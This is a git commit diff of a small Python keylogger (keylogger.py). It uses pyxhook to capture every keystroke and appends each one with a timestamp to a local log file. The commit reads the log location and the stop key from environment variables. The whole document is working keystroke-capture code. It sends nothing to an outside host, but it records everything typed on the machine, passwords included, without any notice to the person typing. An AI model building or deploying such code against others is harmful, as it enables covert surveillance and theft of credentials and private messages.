6b4386ac3748c7bdf4de43d0c6cd80e0e0c3d232
Adrij Shikhar <adrijshikhar85@gmail.com>
2020-08-17 13:39:38 +0530

    feat: updates key logger to use env variables

--- keylogger.py
+++ keylogger.py
@@ -1,24 +1,33 @@
 import pyxhook
 import datetime
-#change this to your log file's path
-log_file='/home/nemesis/Documents/Apps/file.log'
+import os
 
-#this function is called everytime a key is pressed.
+from decouple import config
+
+log_file = config('LOG_LOCATION')
+ascii_key_code = config('GRAVE_KEY_ASCII')
+# this function is called everytime a key is pressed.
+
+if not os.path.exists(log_file):
+    os.mknod(log_file)
+
+
 def OnKeyPress(event):
-  x=datetime.datetime.now()
-  data=str(x.strftime("%c"))+" : "+event.Key
-  fob=open(log_file,'a')
-  fob.write(data)
-  fob.write('\n')
+    x = datetime.datetime.now()
+    data = str(x.strftime("%c")) + " : " + event.Key
+    fob = open(log_file, 'a')
+    fob.write(data)
+    fob.write('\n')
+    if event.Ascii == int(ascii_key_code):
+        fob.close()
+        new_hook.cancel()
 
-  if event.Ascii==126: #126 is the ascii value of the grave key (~)
-    fob.close()
-    new_hook.cancel()
-#instantiate HookManager class
-new_hook=pyxhook.HookManager()
-#listen to all keystrokes
-new_hook.KeyDown=OnKeyPress
-#hook the keyboard
+
+# instantiate HookManager class
+new_hook = pyxhook.HookManager()
+# listen to all keystrokes
+new_hook.KeyDown = OnKeyPress
+# hook the keyboard
 new_hook.HookKeyboard()
-#start the session
+# start the session
 new_hook.start()
